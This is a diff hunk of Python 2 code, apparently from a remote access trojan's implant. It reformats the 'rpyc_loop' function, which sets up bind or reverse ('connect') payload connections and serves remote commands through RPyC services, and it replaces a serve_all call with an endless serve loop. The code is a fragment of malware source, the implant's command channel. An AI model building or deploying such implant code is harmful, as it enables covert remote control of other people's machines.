@@ -215,45 +215,65 @@ def rpyc_loop(launcher):
             try:
                 if type(ret) is tuple: # bind payload
                     server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
-                    s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
+                    s = server_class(
+                        BindSlaveService,
+                        port=port,
+                        hostname=address,
+                        authenticator=authenticator,
+                        stream=stream,
+                        transport=transport,
+                        transport_kwargs=transport_kwargs
+                    )
                     s.start()
+
                 else: # connect payload
                     stream=ret
 
                     def check_timeout(event, cb, timeout=60):
                         time.sleep(timeout)
                         if not event.is_set():
-                            logging.error("timeout occured !")
+                            logging.error('timeout occured!')
                             cb()
 
-                    event=threading.Event()
-                    t=threading.Thread(target=check_timeout, args=(event, stream.close))
-                    t.daemon=True
+                    event = threading.Event()
+                    t = threading.Thread(target=check_timeout, args=(event, stream.close))
+                    t.daemon = True
                     t.start()
+
                     try:
-                        conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
+                        conn = rpyc.utils.factory.connect_stream(
+                            stream,
+                            ReverseSlaveService, {}
+                        )
                     finally:
                         event.set()
-                        t.terminate()
 
-                    attempt=0
-                    conn.serve_all()
+                    attempt = 0
+                    while True:
+                        conn.serve(None)
+
             except KeyboardInterrupt:
                 raise
+
             except EOFError:
                 raise
+
             except SystemExit:
                 raise
+
             except Exception as e:
                 logging.error(e)
 
     except EOFError:
         print "EOFError received, restarting the connection"
+
     except KeyboardInterrupt:
         print "keyboard interrupt raised, restarting the connection"
+
     except SystemExit as e:
         logging.error(e)
         raise
+
     except Exception as e:
         logging.error(traceback.format_exc())
         return
